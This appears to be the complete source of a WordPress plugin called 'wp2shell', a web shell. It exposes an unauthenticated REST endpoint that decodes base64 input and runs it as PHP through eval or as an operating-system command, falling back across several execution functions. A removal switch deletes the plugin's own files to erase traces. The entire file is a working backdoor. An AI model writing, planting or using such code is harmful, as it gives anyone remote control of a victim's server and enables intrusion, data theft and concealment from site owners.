<?php
/* Plugin Name: wp2shell-bd4e69655d66 */
function w2s_run($c, $mode) {
    if ($mode === 'php') { ob_start(); @eval(base64_decode($c)); $r = ob_get_clean(); return $r; }
    $c = base64_decode($c) . ' 2>&1';
    if (function_exists('shell_exec')) { return shell_exec($c); }
    if (function_exists('exec')) { exec($c, $o); return implode("\n", $o); }
    if (function_exists('system')) { ob_start(); system($c); return ob_get_clean(); }
    if (function_exists('passthru')) { ob_start(); passthru($c); return ob_get_clean(); }
    if (function_exists('proc_open')) { $p = proc_open($c, array(1 => array('pipe', 'w')), $pipes); if (is_resource($p)) { $o = stream_get_contents($pipes[1]); proc_close($p); return $o; } }
    return 'W2S_NO_EXEC';
}
add_action('rest_api_init', function () {
    register_rest_route('wp2shell/v1', '/5244a71c79d5036289ac3a1e', array(
        'methods' => 'POST', 'permission_callback' => '__return_true',
        'callback' => function ($r) {
            if ($r->get_param('rm')) {
                require_once ABSPATH.'wp-admin/includes/plugin.php';
                deactivate_plugins(plugin_basename(__FILE__), true);
                $d = dirname(__FILE__);
                foreach (glob($d . '/*') as $f) { @unlink($f); }
                @rmdir($d);
                return new WP_REST_Response(array('marker' => '2b9d8e90709c956e598b2ad9', 'output' => 'WP2SHELL_REMOVED'));
            }
            return new WP_REST_Response(array('marker' => '2b9d8e90709c956e598b2ad9', 'output' => w2s_run($r->get_param('c'), $r->get_param('mode'))));
        },
    ));
});
